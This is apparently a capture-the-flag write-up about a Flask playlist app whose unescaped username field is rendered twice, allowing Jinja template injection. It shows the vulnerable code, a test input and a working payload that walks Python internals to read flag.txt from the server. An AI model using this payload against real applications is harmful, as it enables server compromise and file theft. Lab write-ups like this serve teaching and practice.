## Solve Process
This is a website to render a music playlist.   
![image103](/static/writeups/photos/image103.png)  
Our inputs are rendered here:  
![image104](/static/writeups/photos/image104.png)

Immediately, a few things come to mind:

1. XSS Injection  
2. Jinja Injection (If Flask is used, which it is)

Lets look at the source code to see what we are dealing with  
### app.py (/create\_playlist) 
```python
@app.route("/create_playlist", methods=["POST"])
def post_playlist():
    try:
        username = request.form["username"]
        text = request.form["text"]
        if len(text) > 10_000:
            return "Too much!", 406
        if "{" in text or "}" in text:
            return "Nice try", 406
        text = [line.split(".") for line in text.splitlines()]
        text = [line[:4] + ["?"] * (4 - min(len(line), 4)) for line in text]
        filled = render_template("playlist.html", username=username, songs=text)
        this_id = str(uuid.uuid4())
        with open(f"templates/uploads/{this_id}.html", "w") as f:
            f.write(filled)
        return render_template("created_playlist.html", uuid_val=this_id), 200
    except Exception as e:
        print(e)
        return "Internal server error", 500
```
This code parses username and the song’s we entered into playlist.html, which returns the rendered HTML.  
It then saves the template into a file, which is then rendered again. This is a clear sign of Jinja injection.  
We might be able to inject a Jinja expression into the playlist.html, which is then saved as its own html file, and then rendered again, together with the malicious jinja expression we gave it.

We can see that there is a small check for jinja injection performed on text, but none done on username. It will be far easier to use the **username** for jinja injection. We can verify this by looking at the html.  
### playlist.html  
```html
{% for song in songs %}
<tr>
    <td class="item">{{ "{0:02}".format(loop.index) }}</td>
    {% for field in song %}
    <td class="item">{{ field }}</td>
    {% endfor %}
</tr>
{% endfor %}
```
```html
<p class="item">ORDER #0001 for {{ username|safe }}</p>
<p class="item"></p>
```
By default, Jinja automatically HTML-escapes any characters. The username has the |safe keyword meaning it won’t be escaped. This mean’s quotations won’t be escaped, making life a lot easier.

You can verify the Jinja Injection by setting {{1+1}} as the username  
![image108](/static/writeups/photos/image108.png)

## Crafting the Payload  
The goal of the challenge is to access the file located at flag.txt. In jinja, it is actually possible to open and read files. You can read up more about this [here](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)  
Here's a valid payload  
```python
{{ request.__class__._load_form_data.__globals__.__builtins__.open("flag.txt").read() }} 
``` 
![image109](/static/writeups/photos/image109.png)  
This gets us the flag